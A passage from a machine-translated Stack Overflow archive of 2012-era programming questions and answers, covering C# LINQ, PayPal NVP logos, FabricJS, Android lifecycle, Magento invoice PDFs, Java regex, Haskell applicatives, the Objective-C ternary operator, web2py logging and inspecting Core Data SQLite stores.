                        ((header.DateOrdered.HasValue) ? header.DateOrdered.Value : new DateTime(1900, 1, 1)),
                         UniversalItemMovementConverter.GetMovementKeyFromShippingDocument(header.ClientOrderNumber),
                        detail.ProductCode,
                        header.ClientOrderNumber,
                        string.Empty,
                        ((detail.QuantityDelivered.HasValue) ? detail.QuantityDelivered.Value : 0)) { }).ToList();
            this.UpdateItemMovements(ms);
            register.AddRange(ms); 
```

我对这个主题的某些部分有点模糊，但我认为这与延迟执行有关。如果您将问题行更改为以下内容，您甚至可能会有更好的运气：

```
var ms = new List<ItemMovement>(f.ToList()); 
```

你甚至可能不需要`f.ToList()`。`f`可能就够了。更精通这个主题的人可能能够更全面地解释，但我相信这与强制某种对象的实例化有关。

# php - 不同网站使用同一个paypal账户

> ID：10239621
> 
> 赞同：0
> 
> 时间：2012-04-20T02:54:04.690
> 
> 标签：php, paypal, recurring-billing

我有一个贝宝帐户，我想将它用于我的三个网站。但我想为每个网站支付页面放置不同的标志。我的意思是，如果客户在付款页面上从 site1 到 paypal，我想显示 site1 的徽标。我还想为每个网站显示唯一的电子邮件地址。这甚至可以通过贝宝。

我用谷歌搜索并找到以下网站。

[http://www.e-junkie.com/bb/topic/546](http://www.e-junkie.com/bb/topic/546)（请阅读第二条消息 - Shivani）

我正在使用 php 来集成贝宝。请帮忙。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:02:01.953

我想这是可能的。如果您在 API 请求中使用 PayPal NVP 方法，您只需更改`HDRIMG`每个网站 API 请求的参数即可。

假设在您的第一个网站中，您可能会有这样的内容：

```
$HEADERLOGO = "https://myurl.com/path_to_image/pic.jpg";

// Prepare PayPal NVP (Name-Value Pair) payment request
$nvp  = "METHOD=" . $SETMETHOD;
$nvp .= "&VERSION=" . $VERSION;
$nvp .= "&USER=" . $USERNAME;
$nvp .= "&PWD=" . $PASSWORD;
$nvp .= "&SIGNATURE=" . $SIGNATURE;
$nvp .= "&PAYMENTACTION=" . $PAYMENTACTION;
$nvp .= "&LOCALECODE=" . $LOCALECODE;
$nvp .= "&HDRIMG=" . $HEADERLOGO;

// run curl 
```

然后在您的第二个网站上，只需更改`$HEADERLOGO`.

希望能帮助到你。

注意：建议将图像源放在**https**服务器中。

[SetExpressCheckOut NVP API 参考](https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp_r_SetExpressCheckout)

# canvas - FabricJS 支持 SVG viewBox 元素吗？

> ID：10239622
> 
> 赞同：2
> 
> 时间：2012-04-20T02:54:29.053
> 
> 标签：canvas, svg, viewbox, fabricjs

fabricJS 是否支持 SVG viewBox 元素，以便它只在画布上呈现它？这样，可以轻松实现整个屏幕的缩放。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:16:43.590

不，FabricJS 是基于 Canvas 的，Canvas 和 SVG 是两个非常不同的领域。

FabricJS 可以*解析*SVG 路径并将它们绘制到画布上，但仅此而已。

具体来说，FabricJS 可以解析并绘制到画布上的 SVG 元素有：路径、圆形、多边形、折线、椭圆、矩形、直线和图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-05T15:50:30.490

**走另一条路行得通**

我正在处理一个相关的问题 - 只将画布的一部分渲染到 SVG 中。我使用 viewBox 来确保用户只看到画布中有趣的部分。

[用于 toSVG 的 JSDoc](http://fabricjs.com/docs/fabric.Canvas.html)

# android - onCreate() 与数据库插入

> ID：10239623
> 
> 赞同：0
> 
> 时间：2012-04-20T02:54:29.273
> 
> 标签：android

我的应用程序有高分活动。当游戏活动结束时，它使用 Intent.putExtra() 将游戏状态传递给高分活动

onCreate() 从 extra 中提取游戏并将行插入到数据库表中。

这工作正常......直到我将设备切换到横向模式。onCreate() 再次将该行插入到高分表中。呵呵，我比那更清楚，哈哈。

好的，那么只允许插入一次行的“最佳实践”方式是什么？我不想核对游戏数据，因为我希望显示有关游戏的信息。

思路： 1\. 在附加项中添加一个标志，并在插入行后将其清除。如果标志已清除，则不要再次插入该行。2\. 组织数据库在 dup 插入时抛出密钥冲突失败。3\. 将游戏从 extras 中复制出来，从 extras 中删除，并在 onPause() 和 onResume() 中保存/恢复

你会如何处理这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:03:43.010

您可以通过执行以下操作来设置标志：

```
@Override
        protected void onSaveInstanceState(Bundle outState) {
            super.onSaveInstanceState(outState);
            outState.putBoolean("high_score_saved", true);

        }

    @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
                    if (!savedInstanceSate.getBoolean("high_score_saved", false){
                        //save high score!

                     }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:40:26.867

您可以在 AndroidManifest.xml 中将属性 android:configChanges="orientation" 添加到您的活动声明中。喜欢

```
<activity android:name=".TestActivity" android:configChanges="orientation" /> 
```

如果您的活动在方向更改时不更改其布局，则可以这样做。如果您想在方向更改时更改布局，您可以通过覆盖此方法来执行此操作

```
@Override
public void onConfigurationChanged(Configuration newConfig) {

  super.onConfigurationChanged(newConfig);

  if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
      //your code
  } else if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
     //your code
  }
} 
```

# magento - magento - Invoice : how do I change the dark grey header to white and the font to black

> ID：10239628
> 
> 赞同：1
> 
> 时间：2012-04-20T02:55:18.233
> 
> 标签：magento, magento-1.5

The order and invoice numbers are hard to read on my printed mangento invoices. I want to change the header from the white on dark grey default to plain old black on white. Can anyone point me to the right place to update this?

I was looking in the invoice.php file in Mage\Sales\Model\Order\Pdf but while there appear to be some items from this printed report in there... I cannot see anything having to do with the header.

Thanks

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T03:46:07.173

The file you are looking for is `app/code/core/Mage/Sales/Model/Order/Pdf/Abstract.php`. I have marked the two lines you'll need to change with `// <--`. The documentation for [Zend_Pdf_Color_GrayScale](http://framework.zend.com/manual/1.8/en/zend.pdf.drawing.html#zend.pdf.drawing.color) will tell you that `0.0` is black, `1.0` is white.

```
protected function insertOrder(&$page, $obj, $putOrderId = true)
{
    if ($obj instanceof Mage_Sales_Model_Order) {
        $shipment = null;
        $order = $obj;
    } elseif ($obj instanceof Mage_Sales_Model_Order_Shipment) {
        $shipment = $obj;
        $order = $shipment->getOrder();
    }

    /* @var $order Mage_Sales_Model_Order */
    $page->setFillColor(new Zend_Pdf_Color_GrayScale(1));  // <-- White header

    $page->drawRectangle(25, 790, 570, 755);

    $page->setFillColor(new Zend_Pdf_Color_GrayScale(0));  // <-- Black text
    $this->_setFontRegular($page);

    if ($putOrderId) {
        $page->drawText(Mage::helper('sales')->__('Order # ').$order->getRealOrderId(), 35, 770, 'UTF-8');
    }
    $page->drawText(Mage::helper('sales')->__('Order Date: ') . Mage::helper('core')->formatDate($order->getCreatedAtStoreDate(), 'medium', false), 35, 760, 'UTF-8'); 
```

Additional information (discovered when making this change):

Be aware that the Creditmemo, Invoice, and shipment all share the same basic header from the Abstract file. So when you change the background color of the abstract file there is a line containing the Shipment #, Invoice # or Credit Memo # that is printed in each of the following files that you will also need to address.

The default font color is white and so changing the abstrat background header to white creates a white on white (hence invisible) result.

In the Creditmemo.php, Invoice.php, and Shipment.php files in that same directory find the following line (almost identical across the 3 files) and update it as well.

```
public function getPdf($shipments = array())
{
    // .... a few lines of code .....  //

    /* Add head */
    $this->insertOrder($page, $shipment, Mage::getStoreConfigFlag(self::XML_PATH_SALES_PDF_SHIPMENT_PUT_ORDER_ID, $order->getStoreId()));

    // 0 to print black, 1 to print white
    $page->setFillColor(new Zend_Pdf_Color_GrayScale(1)); 
    $this->_setFontRegular($page); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-12T17:34:22.877

Just a heads up to anyone looking for this answer but not able to find the code to change in Invoice.php, Shipping.php etc.

Im my Magento Version 1.7.0.2 to change the top title invoice number I also made this change in the Abstract.php file around line 512.

```
` public function insertDocumentNumber(Zend_Pdf_Page $page, $text)
    {
        $page->setFillColor(new Zend_Pdf_Color_GrayScale(0));` 
```

Just wanted to share as I personally wasted too much time on this and hope to save the next person some.

# java - 使用 Pattern 扫描整个单词

> ID：10239629
> 
> 赞同：0
> 
> 时间：2012-04-20T02:55:34.910
> 
> 标签：java, regex

我需要使用正则表达式 = \w （或所有单词）来实现 Pattern。

当我运行程序输出应该是：

```
a [1]
is [1]
test[1,2] 
```

但它是：

```
a [1]
e [2]
h [1]
i [1, 1]
s [1, 1, 2]
t [1, 2, 2] 
```

负责扫描和模式匹配的代码如下：

```
public class DocumentIndex {

  private TreeMap<String, ArrayList<Integer>> map = 
  new TreeMap<String, ArrayList<Integer>>();       // Stores words and their locations
  private String regex = "\\w";                //any word

  /**
   * A constructor that scans a document for words and their locations
   */
  public DocumentIndex(Scanner doc){
    Pattern p = Pattern.compile(regex);       //Pattern class: matches words
    Integer location = 0;                   // the current line number
        // while the document has lines
        // set the Matcher to the current line
        while(doc.hasNextLine()){
            location++;
            Matcher m = p.matcher(doc.nextLine());
            // while there are value in the current line
            // check to see if they are words
            // and if so save them to the map
            while(m.find()){
                if(map.containsKey(m.group())){
                    map.get(m.group()).add(location);
                } else {
                    ArrayList<Integer> list = new ArrayList<Integer>();
                    list.add(location);
                    map.put(m.group(), list);
                }
            }
        }
    }
...
} 
```

将整个单词作为模式阅读的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:57:19.613

你需要使用`\\w+`，而不是`\\w`。后者只会匹配一个字符（前者，一个或多个字符）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:31:12.737

`([^ ]+)+`

或者您可以使用[StringTokenizer](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/StringTokenizer.html)类。

# haskell - 在哪里可以找到应用函子的编程练习？

> ID：10239630
> 
> 赞同：29
> 
> 时间：2012-04-20T02:55:49.490
> 
> 标签：haskell, functional-programming, applicative

我一直在阅读有关应用函子的文章，尤其是在 McBride 和 Paterson 的 Functional Pearl 中。但是我想通过做一些练习来巩固我的理解。我更喜欢编程练习，但证明练习也可以。 **哪些练习可以帮助我学习使用应用函子进行有效编程？**

个人练习和其他地方列出的练习的指针一样都可以。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-20T08:22:17.447

发布一些问题作为答案似乎很有趣。`Applicative`这是一个有趣的，基于和之间的相互作用`Traversable`，基于数独。

(1) 考虑

```
data Triple a = Tr a a a 
```

构造

```
instance Applicative Triple
instance Traversable Triple 
```

以便`Applicative`实例进行“矢量化”并且`Traversable`实例从左到右工作。不要忘记构造一个合适的`Functor`实例：检查您是否可以从`Applicative`或`Traversable`实例中提取它。你可能会发现

```
newtype I x = I {unI :: x} 
```

对后者有用。

(2) 考虑

```
newtype (:.) f g x = Comp {comp :: f (g x)} 
```

显示

```
instance (Applicative f, Applicative g) => Applicative (f :. g)
instance (Traversable f, Traversable g) => Traversable (f :. g) 
```

现在定义

```
type Zone = Triple :. Triple 
```

假设我们将 a 表示`Board`为水平区域​​的垂直区域

```
type Board = Zone :. Zone 
```

展示如何使用 的功能将其重新排列为垂直区域的水平区域和正方形的正方形`traverse`。

(3) 考虑

```
newtype Parse x = Parser {parse :: String -> [(x, String)]} deriving Monoid 
```

或其他一些合适的结构（注意`Monoid`|Maybe| 的库行为是不合适的）。构造

```
instance Applicative Parse
instance Alternative Parse  -- just follow the `Monoid` 
```

并实施

```
ch :: (Char -> Bool) -> Parse Char 
```

如果一个给定的谓词接受，它会消耗并传递一个字符。

(4) 实现一个解析器，它消耗任意数量的空白，后跟一个数字（0 表示空白）

```
square :: Parse Int 
```

使用`pure`和`traverse`构造

```
board :: Parse (Board Int) 
```

(5) 考虑常数函子

```
newtype K a x = K {unK :: a} 
```

并构建

```
instance Monoid a => Applicative (K a) 
```

然后使用`traverse`来实现

```
crush :: (Traversable f, Monoid b) => (a -> b) -> f a -> b 
```

构造用于表达其合取和析取幺半群结构的`newtype`包装器。`Bool`用于`crush`实现适用于任何仿函数`any`的版本。`all``Traversable`

(6) 实施

```
duplicates :: (Traversable f, Eq a) => f a -> [a] 
```

计算不止一次出现的值列表。（并非完全微不足道。）（使用微积分有一个很好的方法，但这是另一个故事。）

(7) 实施

```
complete :: Board Int -> Bool
ok :: Board Int -> Bool 
```

它检查一个板是否 (1) 仅包含 [1..9] 中的数字和 (2) 在任何行、列或框中没有重复项。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-04-20T03:43:20.733

一个很好的练习方法是使用`Parsec`applicative 而不是 monadic 风格。大多数解析器都是纯粹的应用程序，因此您永远不需要使用`do`符号。

例如。对于表达式：

```
import qualified Text.Parsec as P
import qualified Text.Parsec.Token as P
import Control.Applicative

data Expr = Number Int | Plus Expr Expr

lex = P.makeTokenParser ...  -- language config

expr = number <|> plus
    where
    number = Number <$> P.integer lex
    plus = Plus <$> number <* P.symbol lex "+" <*> expr 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-20T03:03:15.727

查看[Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia#Applicative)。它从头开始提供了很好的解释，并在此过程中进行了一些练习。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-04-20T03:10:58.157

例如：[应用函子](http://www.cis.upenn.edu/~cis194/lectures/2012-03-22.html)

# objective-c - 不活跃？@"inactive": @"active" 语法？

> ID：10239632
> 
> 赞同：0
> 
> 时间：2012-04-20T02:56:06.153
> 
> 标签：objective-c, ios

有人可以解释一下`inactive ? @"inactive": @"active"`吗？

这 ？: 似乎是一个布尔条件结构（错误的术语），但我不太明白。不知道叫什么所以查不到。

看起来像：

> 一些布尔值？*如果它是错误的使用* 冒号**之前的内容：***否则使用* **之后的内容**

我知道它被用来确定使用哪个字符串作为格式标记（在下面的代码中）。我只是不知道这是什么？：位被调用，它可能有什么限制/注意/滥用。

*（而且 ObjC 不是`rilly`很难以文明的方式格式化）*

```
 UIAlertView* av = [[UIAlertView alloc] initWithTitle:@"Hey" 
                                             message:[NSString 
                                    stringWithFormat:@"While %@, I received a local notification: %@",
                                                      inactive ? @"inactive": @"active", n.alertBody] 
                                            delegate:nil 
                                   cancelButtonTitle:@"OK" otherButtonTitles:nil];
[av show]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:20:23.787

这 ?: 东西称为**条件运算符**或**三元运算符**。

它代表一个简单的条件

```
if ( CONDITION )
    x = a;
else
    x = b; 
```

可以翻译成

```
x = CONDITION ? a : b 
```

从中您可能可以得出您尝试完成/理解的功能。请记住，尽管您可以将其用作普通 if/else-if/else 结构的替代品，但在任何“赋值相关操作”之外对三元运算符的使用进行编程都被认为是错误的。

在[它的维基百科页面中，](http://en.wikipedia.org/wiki/%3F%3a)您可以找到各种不同编程语言中使用的条件运算符的示例。也检查[这个](http://en.wikipedia.org/wiki/Ternary_operator)，三元运算符页面。

*Obs：事实证明，三元运算符不一定是条件表达式，而是任何接受三个参数的运算符。因为对于大多数编程语言来说，唯一的三元运算符是 inline-if... 好吧，这就是它通常所说的。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T02:58:48.390

它被称为[*条件运算符*](http://en.wikipedia.org/wiki/?%3a)，一种*三元运算符*（与更熟悉的*二元* `a+b`或*一元运算* `!flag`符相反）。

条件运算符接受一个条件，对其进行评估，并根据该结果返回其第二个或第三个操作数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:00:40.593

[您可以在此处](http://en.wikipedia.org/wiki/?%3a)阅读更多信息。

当`if`涉及到很多 simple 时，使用该运算符可以大大减少代码长度。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T03:00:11.690

它是一个三元运算符，但你把它倒过来了——如果布尔值是真的，那么做冒号之前的事情，否则，做之后的事情。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T03:01:02.090

这称为*三元运算符*，它的工作方式与您描述的完全一样：

*表达**？**真值**：**假值*；

例如，你可以用它来避免 if - else：

```
int maxValue = a > b ? a : b; 
```

**编辑：** @dasblinkenlight 是正确的，您所说的运算符实际上称为条件运算符，它是一种三元运算符。

# python - 在 gae 管理控制台中找不到日志消息

> ID：10239633
> 
> 赞同：1
> 
> 时间：2012-04-20T02:56:07.203
> 
> 标签：python, google-app-engine, logging, web2py

我在 gae 上部署了一个 web2py 应用程序。对于日志记录，*. 复制“logging.example.conf”并将其重命名为“logging.conf”

```
*.added myapp to [loggers]
[loggers]
keys=root,rocket,markdown,web2py,rewrite,app,welcome,myapp

*.added [logger_myapp]
[logger_myapp]
level=WARNING
qualname=web2py.app.myapp
handlers=consoleHandler
propagate=0

*.imported logging in controller(default.py)
import logging
logger = logging.getLogger("web2py.app.myapp")
logger.setLevel(logging.WARNING)

*.logged in index():
logger.warn('logging test') 
```

但是，我在 gae 管理控制台中找不到此日志消息。有什么我错过的吗？

# ios - 如何检查存储在我的核心数据数据库中的内容？

> ID：10239634
> 
> 赞同：66
> 
> 时间：2012-04-20T02:56:07.840
> 
> 标签：ios, core-data

我正在制作一个依赖 Core Data 的应用程序。我能够在文本字段中输入数据并存储它。

但我需要知道数据是否被存储。

我正在尝试为我的 tableView 制作一个 detailView，但没有得到任何结果。现在我想知道是因为我的代码做错了什么，或者数据是否被正确存储。

如何查看应用程序的 CoreData 数据库中存储的内容？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2016-05-18T12:50:57.700

这是我的解决方案（适用于 iOS 9）：

我使用 automator/bash 脚本在 sqllitebrowser 中打开数据库。该脚本在模拟器中查找最新安装的应用程序。指示：

1.  为 SQLite 安装数据库浏览器 ( [http://sqlitebrowser.org/](http://sqlitebrowser.org/) )
2.  在 Apple Automator 中创建新的工作流程。
3.  拖动“运行 Shell 脚本块”并粘贴以下代码：

> ```
> cd ~/Library/Developer/CoreSimulator/Devices/
> cd `ls -t | head -n 1`/data/Containers/Data/Application 
> cd `ls -t | head -n 1`/Documents
> open -a DB\ Browser\ for\ SQLite ./YOUR_DATABASE_NAME.sqlite 
> ```

[![在此处输入图像描述](../Images/954aefe557db4ce380bedc720993af2b.png)](https://i.stack.imgur.com/e7Vni.png)

4.  （可选）将此工作流程转换为应用程序，保存并将其拖到您的停靠栏中。要刷新数据库，只需单击应用程序图标。

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2018-03-01T07:05:31.900

**斯威夫特 4, 5**

`AppDelegate`在>>`didFinishLaunchingWithOptions`函数中添加这一行：

```
print("Documents Directory: ", FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).last ?? "Not Found!") 
```

你的`modelName.sqlite`文件会在那里。

您可以使用任何免费的 SQLite 浏览器工具（例如[http://sqlitebrowser.org/](http://sqlitebrowser.org/) ）打开它。

* * *

## 回答 #3

> 赞同：38
> 
> 时间：2012-04-20T03:19:44.743

如果您`sqlite`用作存储媒体`Core Data`，您可以在模拟器中运行您的应用程序并尝试检查位于沙盒库文件夹中的数据库文件。

路径应类似于：`~/Library/Application Support/iPhone Simulator/5.1/Applications/3BF8A4B3-4959-4D8F-AC12-DB8EF4C3B6E1/Library/YourAppName.sqlite`

要打开`sqlite`文件，您需要一个工具。我使用一个名为 Liya 的免费工具（[http://itunes.apple.com/us/app/liya/id455484422?mt=12](http://itunes.apple.com/us/app/liya/id455484422?mt=12)）。

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2019-01-25T11:34:19.543

其他解决方案要么是旧的，要么不能轻松或快速地将您引导到 SQLite 文件，所以我想出了自己的解决方案，使用`FileManager.SearchPathDirectory.applicationSupportDirectory`它可以获取 sqlite 文件的确切路径。

```
func whereIsMySQLite() {
    let path = FileManager
        .default
        .urls(for: .applicationSupportDirectory, in: .userDomainMask)
        .last?
        .absoluteString
        .replacingOccurrences(of: "file://", with: "")
        .removingPercentEncoding

    print(path ?? "Not found")
} 
```

`whereIsMySQLite()`将在此处打印您可以在 Mac 上简单复制粘贴的路径：

> Finder > 前往 > 前往文件夹

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2015-11-09T09:21:58.997

存储 db 的文件夹最近已更改，并且不是您希望找到的文件夹。这是我用来解决这个问题的方法：首先将此代码添加到您的 viewDidLoad 或 applicationDidFinishLaunching：

```
 #if TARGET_IPHONE_SIMULATOR
    // where are you?
    NSLog(@"Documents Directory: %@", [[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject]);
    #endif 
```

从这里得到这个： [ios 8 模拟器的文档目录在哪里](http://pinkstone.co.uk/where-is-the-documents-directory-for-the-ios-8-simulator/)

这将在运行时显示您的应用在控制台中的实际位置。然后使用[SQLiteBrowser](http://sqlitebrowser.org/ "SQLite浏览器")检查 SQLite DB 的内容。

对我来说就像一个魅力;)

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2017-01-25T11:44:41.863

就 macOS Sierra 版本 10.12.2 和 Xcode 8 而言

该文件夹应该在这里：

`/Users/$username$/Library/Developer/CoreSimulator/Devices/$DeviceID$/data/Containers/Data/Application/$ApplicationID$/Library/Application Support/xyz.sqlite`

要获取设备 ID - 打开终端并粘贴：

```
instruments -s devices 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2012-04-20T04:17:41.920

如前所述，您可以使用 sqllite 命令行工具。

但是，您也可以设置调试标志，这将在它们通过核心数据执行时转储所有 sql 命令。

编辑方案，并将其添加到“启动时传递的参数”中

-com.apple.CoreData.SQLDebug 1

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2016-11-30T12:12:17.697

在 Swift 3 中，你有`NSPersistentContainer`并且你可以从那里检索路径，如下所示：

```
persistentContainer.persistentStoreCoordinator.persistentStores.first?.url 
```

（假设您只使用一个持久存储）

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2016-11-11T07:14:36.123

1）获取模拟器的sql数据库路径。

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSLog(@"%@", [paths objectAtIndex:0]); 
```

2) 打开查找器。按`Cmd`+ `Shift`+ `G`。粘贴您从第 1 段中获得的内容。例如：

```
/Users/USERNAME/Library/Developer/CoreSimulator/Devices/701BAC5F-2A42-49BA-B733-C39D563208D4/data/Containers/Data/Application/DCA9E9C7-5FEF-41EA-9255-6AE9A964053C/Documents 
```

3) 在[SQLPro](https://itunes.apple.com/ru/app/sqlpro-for-sqlite-read-only/id635299994?mt=12)等 AppStore 程序中下载。

4) 在名为“ProjectName.sqlite”的文件夹中打开文件。

做得好！你会看到这样的东西： [![在此处输入图像描述](../Images/b74d0068de29140f2634269424d94ba6.png)](https://i.stack.imgur.com/I90mb.png)

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2020-01-14T10:05:33.243

定位 Core Data 数据库以及查看和分析内容的一种简单方便的方法是使用**Core Data Lab**之类的工具。

更多信息：[https ://betamagic.nl/products/coredatalab.html](https://betamagic.nl/products/coredatalab.html)

*免责声明*：我是这个工具的创造者。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2012-04-20T03:22:17.507

[从这里](http://sqlitebrowser.sourceforge.net/)下载 SQLite 浏览器。

在模拟器中运行您的应用程序。该应用程序应复制到 Mac 上如下所示的路径：

```
/Users/$your username$/Library/Application Support/iPhone Simulator/$your iphone simulator version$/Applications/ 
```

找到您的应用程序后，您必须深入挖掘以找到 sqlite db（通常在 Documents 下）。

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2017-09-16T05:52:15.340

作为一个菜鸟的答案，我花了很多时间来弄清楚它。我遵循的步骤是：

1.  打开取景器并按下`Command(Windows) + Shift + G`。
2.  转到文件夹添加`~/Library/Developer`
3.  搜索您`my.db`在 SQLite 中创建的数据库名称。
4.  下载并安装 SQLite 的 DB 浏览器。
5.  单击打开数据库。
6.  现在从您的查找器中拖放数据库文件。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2019-10-25T17:39:04.190

由于没有人指出，如何从物理设备中获取 sqlite DB。

以下是获取应用程序数据的方法：

[在工作站上浏览我正在开发的 iOS 应用程序在设备上创建的文件？](https://stackoverflow.com/questions/6121613/browse-the-files-created-on-a-device-by-the-ios-application-im-developing-on-w)

打开 .xcappdata 文件（右键单击 > 显示包内容）后，您通常会在 AppData/Library/Application Support 文件夹中找到 DB 文件。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2016-03-31T08:00:58.817

我无法在 iPhone Simulator 文件夹中找到它。然后我通过在日志中打印文档路径找到了该文件夹：

```
NSLog(@"The Path is %@", 
  [[[NSFileManager defaultManager] URLsForDirectory:
     NSDocumentDirectory inDomains:NSUserDomainMask] lastObject]); 
```

路径原来是这样的：

```
// /Users/<username>/Library/Developer/CoreSimulator/Devices/<app specific id>/data/Containers/Data/Application/<id>/Documents/coredata.sqlite 
```

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2020-09-01T03:12:33.210

我发现查找和打开 .sqlite 数据库的最佳方法是使用此脚本：

```
lsof -Fn -p $(pgrep YOUR_APP_NAME_HERE) | grep .sqlite$ | head -n1 
```

无论出于何种原因，我的 Mac 上的输出总是有一个额外的`n`字符，所以我不得不将它复制并粘贴到`open`命令中。如果您找到正确的命令，请随意修改上述命令。

对于最好的 SQLite 浏览器，我推荐 TablePlus。

采用自： [https ://lukaszlawicki.pl/how-to-quickly-open-sqlite-database-on-ios-simulator/](https://lukaszlawicki.pl/how-to-quickly-open-sqlite-database-on-ios-simulator/)

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2021-02-10T16:03:57.540

很惊讶没有人提到这一点，但假设您的核心数据存储是 sqlite，您可以在终端中执行此操作，无需 3rd 方工具即可对其内容进行快速和脏转储：

```
$ sqlite3 <path-to-file.sqlite>

// Dump everything
sqlite> .dump

// Dump just one type
sqlite> .dump ZSOMETYPE

// ^D to exit 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2017-04-14T06:41:08.293

如果您已经访问过 sqlite、shm 和 wal 文件，则在终端中运行命令将 WAL 文件合并到 sqlite 文件中。

```
$ sqlite3 persistentStore
sqlite> PRAGMA wal_checkpoint;
Press control + d 
```

运行上述命令后，您可以在 sqlite 文件中看到数据。

* * *

### 用于将 sqlite 文件复制到桌面的实用程序（请更改桌面路径并提供绝对路径，该`~`符号将不起作用。

因为`iOS 10.0+`你可以使用 `persistentContainer.persistentStoreCoordinator.persistentStores.first?.url`

我创建了将 sqlite 文件复制到所需位置的实用程序函数（仅适用于模拟器）。您可以使用它喜欢的实用程序

```
import CoreData

let appDelegate = UIApplication.shared.delegate as! AppDelegate
UTility.getSqliteTo(destinationPath: "/Users/inderkumarrathore/Desktop", persistentContainer: appDelegate.persistentContainer) 
```

这是[swift实用方法的定义](/questions/tagged/swift "显示标记为“迅速”的问题")

```
/**
 Copies the sqlite, wal and shm file to the destination folder. Don't forget to merge the wal file using the commands printed int the console.
 @param destinationPath Path where sqlite files has to be copied
 @param persistentContainer NSPersistentContainer
*/
public static func getSqliteTo(destinationPath: String, persistentContainer: NSPersistentContainer) {
  let storeUrl = persistentContainer.persistentStoreCoordinator.persistentStores.first?.url

  let sqliteFileName = storeUrl!.lastPathComponent
  let walFileName = sqliteFileName + "-wal"
  let shmFileName = sqliteFileName + "-shm"
  //Add all file names in array
  let fileArray = [sqliteFileName, walFileName, shmFileName]

  let storeDir = storeUrl!.deletingLastPathComponent()

  // Destination dir url, make sure file don't exists in that folder
  let destDir = URL(fileURLWithPath: destinationPath, isDirectory: true)

  do {
    for fileName in fileArray {
      let sourceUrl = storeDir.appendingPathComponent(fileName, isDirectory: false)
      let destUrl = destDir.appendingPathComponent(fileName, isDirectory: false)
      try FileManager.default.copyItem(at: sourceUrl, to: destUrl)
      print("File: \(fileName) copied to path: \(destUrl.path)")
    }
  }
  catch {
    print("\(error)")
  }
  print("\n\n\n ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ NOTE ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~\n")
  print("In your terminal run the following commands to merge wal file. Otherwise you may see partial or no data in \(sqliteFileName) file")
  print("\n-------------------------------------------------")
  print("$ cd \(destDir.path)")
  print("$ sqlite3 \(sqliteFileName)")
  print("sqlite> PRAGMA wal_checkpoint;")
  print("-------------------------------------------------\n")
  print("Press control + d")      
} 
```

* * *

对于[目标-c](/questions/tagged/objective-c "显示标记为“objective-c”的问题")

```
/**
 Copies the sqlite, wal and shm file to the destination folder. Don't forget to merge the wal file using the commands printed int the console.
 @param destinationPath Path where sqlite files has to be copied
 @param persistentContainer NSPersistentContainer
 */
+ (void)copySqliteFileToDestination:(NSString *)destinationPath persistentContainer:(NSPersistentContainer *)persistentContainer {
  NSError *error = nil;
  NSURL *storeUrl = persistentContainer.persistentStoreCoordinator.persistentStores.firstObject.URL;
  NSString * sqliteFileName = [storeUrl lastPathComponent];
  NSString *walFileName = [sqliteFileName stringByAppendingString:@"-wal"];
  NSString *shmFileName = [sqliteFileName stringByAppendingString:@"-shm"];
  //Add all file names in array
  NSArray *fileArray = @[sqliteFileName, walFileName, shmFileName];

  // Store Directory
  NSURL *storeDir = storeUrl.URLByDeletingLastPathComponent;

  // Destination dir url, make sure file don't exists in that folder
  NSURL *destDir = [NSURL fileURLWithPath:destinationPath isDirectory:YES];

  for (NSString *fileName in fileArray) {
    NSURL *sourceUrl = [storeDir URLByAppendingPathComponent:fileName isDirectory:NO];
    NSURL *destUrl = [destDir URLByAppendingPathComponent:fileName isDirectory:NO];
    [[NSFileManager defaultManager] copyItemAtURL:sourceUrl toURL:destUrl error:&error];
    if (!error) {
      RLog(@"File: %@ copied to path: %@", fileName, [destUrl path]);
    }
  }

